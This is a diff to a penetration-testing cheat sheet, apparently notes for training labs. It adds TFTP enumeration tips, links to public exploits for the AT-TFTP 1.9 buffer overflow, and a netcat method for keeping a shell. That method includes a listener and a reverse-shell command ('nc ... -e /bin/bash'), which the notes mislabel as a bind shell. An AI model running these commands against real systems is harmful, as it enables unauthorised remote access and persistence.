@@ -123,6 +123,10 @@ $ echo VRFY 'admin' | nc -nv -w 1 $target_ip 25
 
 ### DNS - TCP 53
 
+NOTE:
+* If there is TCP running on the machine, then there may be a TFTPd service running (scan UDP port 69).
+* Vulnerability may be related to TFTPd service running on port 69.
+
 Enumeration
 ```bash
 $ nmap -p53 [target] --script=*dns*
@@ -156,6 +160,13 @@ imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
 vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
 friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
 ```
+
+### TFTP (trivial file transfer protocol) - UDP 69
+
+Allied Telesyn TFTP Server (AT-TFTP) 1.9 Remote Buffer Overflow
+* Public exploit: https://github.com/shauntdergrigorian/cve-2006-6184
+* MSF exploit: https://www.exploit-db.com/exploits/16350
+
 
 ### Kerberos - TCP 88
 
@@ -686,6 +697,19 @@ $ wine exploit.exe
 ```
 
 # OTHER THINGS
+
+__Maintaining access to a box with unstable shell__
+
+METHOD: Transfer netcat
+1. Set up listener on attacker box `nc -nvlp 4444`.
+2. Transfer nc/nc.exe to /temp or a dir with write privileges.
+3. Execute bind shell `nc 10.11.0.222 4444 -e /bin/bash`.
+4. You are now connected in a separate process that is stable.
+
+METHOD: Locate process-killing script and edit it.
+1. Find the script that detects/triggers killing of the vulnerable service.
+2. Edit the script so it won't kill the service.
+3. Your shell should be stable now.
 
 __Cracking Web Pages__
 
